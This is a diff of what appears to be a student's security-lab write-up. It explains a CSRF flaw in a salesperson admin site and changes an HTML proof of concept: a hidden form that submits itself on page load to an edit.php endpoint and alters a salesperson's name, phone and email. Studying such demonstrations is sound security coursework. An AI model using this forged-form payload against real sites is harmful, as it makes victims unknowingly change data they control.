@@ -66,14 +66,17 @@ This site is not configured correctly for CSRF protection. A hacker can submit a
 in the feedback page that alters the salesperson's information. When the site is configured propertly, this action is only for the administrator. In my demostration video, I show how to change information of Elizabeth Olson to Elizabeth Suzuki. When the Administrator follows the link, they submit the bad form. 
 ```
 <html>
-  <body onload="document.hiddenForm.submit()">
-    <form name="hiddenForm" style="display:none" action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=6" target="target" method="post">
-      <input type="text" name="first_name" value="Elizabeth" />
-      <input type="text" name="last_name" value="Suzuki" />
-      <input type="text" name="phone" value="555-532-3209" />
-      <input type="text" name="email" value="eolson@salesperson.com" />
+    <head>
+        <title>FAKE FORM</title>
+    </head>
+  <body onload="document.form.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Ken" />
+      <input type="text" name="last_name" value="BAAAARRRLLER" />
+      <input type="text" name="phone" value="555-352-9654" />
+      <input type="text" name="email" value="kbarker@salesperson.com" />
     </form>
-    <iframe name="target" style="display:none" ></iframe>
+    <iframe name="hidden_results" style="display:   none;" ></iframe>
   </body>
 </html>
 
